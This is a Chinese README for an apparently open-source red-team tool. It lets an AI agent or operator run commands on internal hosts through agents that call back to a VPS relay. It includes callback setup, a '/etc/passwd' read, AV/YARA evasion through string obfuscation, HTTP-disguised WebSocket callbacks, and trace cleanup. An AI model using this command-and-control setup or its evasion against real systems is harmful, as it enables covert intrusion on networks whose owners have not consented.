# rtx — 反向 RPC 内网穿透执行器

**[English](README.md) | 中文**

一个 **反向 RPC 内网穿透执行器**：让本地的 AI / 终端像操作本地一样，在只有「已上线 agent」能访问的内网/隔离目标机器上执行命令、读写文件。

> ## ⚠️ 免责声明 / Disclaimer
>
> 本工具**仅限用于已授权的安全测试 / 红队演练 / CTF 竞赛 / 防御性安全研究与学习**。
> 使用者必须：
> - 事先取得目标系统所有者的**明确书面授权**；
> - 严格遵守测试授权范围与适用法律法规（如《网络安全法》《数据安全法》等）；
> - 对使用本工具造成的任何直接或间接后果自行承担全部责任。
>
> 作者不对任何未授权使用、滥用或违法行为负责。请勿将本工具用于任何非法目的。
> 如不同意以上条款，请勿下载、使用或分发本工具。

## 解决什么问题

打多层内网/隔离网络时，本机往往无法直接访问目标，只有已部署的内网机器（跳板）可达。传统做法是手动拼 `proxychains`、上传工具、来回搬运文件。rtx 把「在远程机器执行」变成一等能力：

```
本地（AI / 大脑）                  VPS（中转 server）              内网目标机器（agent）
  ├─ SSH 隧道 → 控制 API            ├─ 接收 agent 反连（公网）        ├─ reverse 回连
  └─ rtxctl / rtx_* 工具 ────────▶ └─ 任务路由 ──────────────────▶ └─ 原生命令执行
```

**设计要点**：
- **大脑在外部、执行器在内网**：API key / 模型推理不落地内网，内网 agent 不需要出网到模型 API
- **执行器 3MB 静态二进制**：Go 全标准库实现（零第三方依赖），Linux / Windows / macOS / ARM 全平台
- **Reverse RPC**：agent 主动回连，穿透 NAT 和多层隧道，断线自动重连（随机 jitter）
- **AI 远程执行**：agent 作为 AI 的执行端——命令在目标机器上原生执行（Linux= bash / Windows= cmd），结果直接回到本地

## 组件

| 组件 | 说明 |
|---|---|
| `agent` | 执行器：反连 server，执行 exec/read/write/list/info/upload/download/kill；回连支持 TCP/TLS/ws/wss；Windows 版内嵌 busybox（Unix 语法执行） |
| `server` | 控制器：agent 注册管理 + 控制 HTTP API + 任务路由 |
| `rtx` | CLI：通过控制 API 派发任务 |
| `rtxctl` | 便捷封装：token 管理、默认 agent、enter/exit/connect（TUI 选节点） |
| `rtx_ui.py` | 节点连接选择器（仿 VS Code Remote 的 TUI） |
| `rtx_mcp_server.py` | Claude Code / MCP 客户端工具（rtx_ls/rtx_enter/rtx_exec/...） |

## 快速开始

```bash
# 构建（全标准库，无第三方依赖）
go build -ldflags="-s -w" -trimpath -o bin/server ./cmd/server
go build -ldflags="-s -w" -trimpath -o bin/rtx ./cmd/rtx
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o bin/agent-linux-amd64 ./cmd/agent

# 1. VPS 上起 server（中转控制器）
#    :9000 接收 agent 反连（公网，云安全组放行）；控制 API 仅绑 127.0.0.1
./server -l :9000 -t <强随机token> --ctrl 127.0.0.1:9001

# 2. 本地隧道接控制 API
ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>

# 3. 内网机器部署 agent（零依赖，上传即跑；多平台产物见 bin/）
./agent-linux-amd64 -c <vps>:9000 -t <token> -i <唯一机器名> -q

# TLS 加密信道（v1.1，agent 直连公网时推荐）:
#   server 加 -tls → 自动生成证书并打印 pin(fp)；agent 加 -tls -pin <fp> 回连（证书指纹校验防中间人）
./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -tls
./agent-linux-amd64 -c <vps>:9000 -t <token> -i <name> -tls -pin <server打印的fp>

# Windows 目标注意: agent 内嵌 busybox — 用 Unix 语法执行命令（ls/cat/grep/wget/管道），
#   路径用 C:/正斜杠（如 C:/Windows/Temp，非 /tmp /c/）；Windows 原生 exe（ipconfig 等）可透传

# WebSocket 回连（v1.2，HTTP 白名单/DPI 只放 HTTP 的出网环境）:
#   server 加 -wsl :19080（-tls 时该端口为 wss）；agent 用 -c ws:// / -c wss:// 反连
./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -wsl :19080
./agent -c ws://<vps>:19080 -t <token> -i <name>          # ws（明文）
./agent -c wss://<vps>:19080 -t <token> -tls -pin <fp>    # wss（TLS）

# 4. 本地操作（rtxctl 已封装 token/默认 agent）
rtxctl connect          # TUI 选节点 → 进入执行环境
rtxctl ls               # 在线 agent
rtxctl exec -cmd "whoami"
rtxctl read -path /etc/passwd
rtxctl upload -path /tmp/x -file ./本地
```

## 实战链路：本地模型 + 内网目标 + VPS 中转（最常见用法）

AI/大模型跑在本地（密钥、推理在本地），目标在内网（只有部署的 agent 够得到），用一台公网 VPS 做中转控制。**模型推理与控制是两条独立流**：推理流本地直连公网模型 API；控制流经 VPS 中转（VPS 只跑 server，不跑模型、不存密钥）。

```
本地 AI ──模型API──▶ 公网（推理，不经 VPS）
本地 AI ─SSH隧道─▶ VPS server ─▶ 内网 agent ─▶ 目标执行（控制，经 VPS）
```

### 搭建（5 步）

```bash
# 1) VPS 起 server（C2 中转）— 云安全组放行 9000
TOKEN=$(openssl rand -hex 16)
./server-linux-amd64 -l :9000 -t "$TOKEN" --ctrl 127.0.0.1:9001   # 加 -tls 加密、-wsl :9080 开 WS
# 2) 本地接控制面
ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>
# 3) 本地配置
rtxctl init --ctrl http://127.0.0.1:9001 --token "$TOKEN"
# 4) 内网目标部署 agent（单文件，架构对应产物）
./agent -c <vps>:9000 -t "$TOKEN" -i <名> -tls -pin <server打印fp> -q
# 5) 本地操作（AI 经 rtx_* 工具/rtxctl 控制内网机）
rtxctl ls && rtxctl exec -cmd "whoami"
```

内网 agent 反连方式按出网环境自选：**TCP**（默认）/ **TLS**（`-tls -pin`）/ **ws|wss**（HTTP 白名单/DPI，`-c ws://`）；多层内网用 Stowaway 递送端口，agent 拨最近一跳。Windows agent 内嵌 busybox（Unix 语法）。

### 排障要点
- `rtxctl ls` 空 → 查本地隧道、VPS server、token
- agent 不上线 → 查内网到 VPS 出网、token、TLS pin
- 模型不工作 → 与 rtx 无关，查本地到模型 API（链路独立）

## 远程可达性场景

- 本机访问不到目标、上线 agent 可达 → 把 agent 部署到可达机器，AI 全部操作穿透到该机器
- 多层内网 → agent 经隧道端口映射 / socks5（`-proxy`）反连
- 集成 AI → Claude Code MCP（`rtx_mcp_server.py`），AI 直接调用 rtx_* 工具在 agent 上执行

## 构建产物

各平台均 ~3MB：darwin / linux-amd64 / linux-arm64 / windows-amd64 / windows-arm64
（`-ldflags="-s -w"` + CGO=0 + 全标准库）

## 安全

- 控制 API 仅绑定 127.0.0.1（本地经 SSH 隧道访问）
- agent 注册需 token 认证
- 行动注意：EDR 环境部署 agent 走合法通道；用后 kill + 清理残留

## Changelog / 更新记录

### v1.2（2026-09）
- **WebSocket 自包含回连（ws:// / wss://）**：agent 无需额外落地隧道工具即可伪装 HTTP/WebSocket 流量反连，穿透「只放行 HTTP」的出口白名单/DPI 环境；wss（WS over TLS，沿用 `-tls -pin` 证书指纹校验）提供加密信道。多级内网仍可叠加 Stowaway 递送端口。
- **Windows agent 内嵌 busybox**：Windows 目标上可用 **Unix 语法**执行命令（`ls`/`cat`/`grep`/`sed`/`wget`/管道/`for` 循环），路径用 `C:/正斜杠`（`$TEMP` 可用），替代低效的 PowerShell/cmd 语法；Windows 原生 exe（`ipconfig`/`netstat` 等）经 busybox sh 自动透传。
- **执行语义修正**：`rtxctl` 去掉与本地 Kali 执行后端的桥接——agent 命令一律按 agent **原生系统**执行（Linux=bash / Windows=busybox sh 或 cmd），不再假设 Kali 语义；需要 Kali 工具链时经本机 Kali 环境。

### v1.1（2026-09）
- **TLS 加密信道**：server `-tls` 自动生成自签证书并打印证书指纹（`pin(fp)`）；agent `-tls -pin <fp>` 回连，证书指纹校验防中间人/嗅探。直连公网 server 时建议启用（走已有加密隧道时可作纵深）。
- **静态特征加固**（降低 AV/YARA 签名命中面）：
  - module 路径中性化（`rtx` → 中性名），二进制不再暴露项目标识
  - 关键字符串异或混淆运行时解密（shell 路径 / 错误串 / 协议标记等）
  - flag 帮助文本静默化（`-h`/参数错误不再输出说明）
- **文档**：新增 `README_EN.md`（英文版）

### v1.0（初始）
- 反向 RPC 执行器：agent / server / rtx CLI / rtxctl / rtx_ui（TUI 节点选择）
- 多平台静态二进制（linux/windows/darwin, amd64/arm64）

## Credits / 致谢

- 感谢 [lanyi1998](https://github.com/lanyi1998) —— 本项目 `rtxctl connect` 的连接选择器界面灵感来自其 [pi-remote](https://github.com/lanyi1998/pi-remote) 项目（Saved remote connections 交互范式）。

## License

MIT
